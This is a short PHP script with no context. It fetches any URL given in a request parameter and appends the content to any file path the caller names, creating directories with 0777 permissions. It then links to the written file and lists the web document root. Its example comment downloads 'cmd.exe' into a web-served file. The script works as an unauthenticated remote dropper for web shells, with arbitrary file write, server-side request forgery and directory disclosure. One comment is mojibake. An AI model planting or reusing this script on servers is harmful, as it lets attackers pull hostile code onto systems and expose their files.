<?
	//http://127.0.0.1/?url=http://127.0.0.1/cmd.exe&file=a.txt
	$url  = trim($_REQUEST['url']);
	$file = trim($_REQUEST['file']);
	$html = file_get_contents($url);
	
	if($url=="") exit;
	
	if($file=="")
	{
		 $file = explode("/",$url);
		 $file = $file[count($file)-1];		 
	}		
	txt_to_file_ex($html ,$file);
	$url = GetFullUrl($file);
	echo "<a href=$url>$url</a>";
	
	//...�ı�д���ļ�,����ļ����ڣ������ĩβ������д����ֽ���
	function txt_to_file_ex($txt ,$filename)
	{
		$dir = dirname($filename);
		if (!file_exists($dir)) mkdir($dir,0777,true); 
		return file_put_contents($filename , $txt ,FILE_APPEND);
	}
	 echo $_SERVER['DOCUMENT_ROOT'].$_SERVER['SCRIPT_NAME'];
function GetFullUrl($file)
{
		$rootpath = $_SERVER["DOCUMENT_ROOT"];
		$rootpath = str_ireplace("\\","/",$rootpath);
		$file = str_ireplace("\\","/",$file);
		$file = str_ireplace($rootpath,"",$file);
		$file = "/".$file;
		$file = str_ireplace("//","/",$file);
		$file = str_ireplace("//","/",$file);
		$returl     = "http://".$_SERVER["HTTP_HOST"].$file;
		return $returl;
}
	
	print_r(scandir($_SERVER["DOCUMENT_ROOT"]));
	print_r(glob($_SERVER["DOCUMENT_ROOT"]."/*",GLOB_MARK));
?>
